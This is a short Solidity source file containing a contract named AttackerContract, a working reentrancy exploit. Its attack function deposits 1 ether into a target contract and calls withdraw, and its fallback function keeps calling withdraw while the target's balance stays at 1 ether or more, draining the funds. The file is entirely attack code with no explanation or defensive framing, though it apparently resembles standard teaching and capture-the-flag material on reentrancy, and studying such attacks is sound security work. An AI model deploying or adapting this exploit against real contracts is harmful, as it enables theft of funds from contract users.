// SPDX-License-Identifier: MIT
pragma solidity ^0.5.17;

contract AttackerContract {
    address public vulnerableContract;

    constructor(address _vulnerableContract) public {
        vulnerableContract = _vulnerableContract;
    }

    function() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            (bool success, ) = vulnerableContract.call(abi.encodeWithSignature("withdraw()"));
            require(success, "Withdraw failed");
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum 1 ether required");
        (bool success, ) = vulnerableContract.call.value(1 ether)(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit failed");
        (success, ) = vulnerableContract.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Initial withdraw failed");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

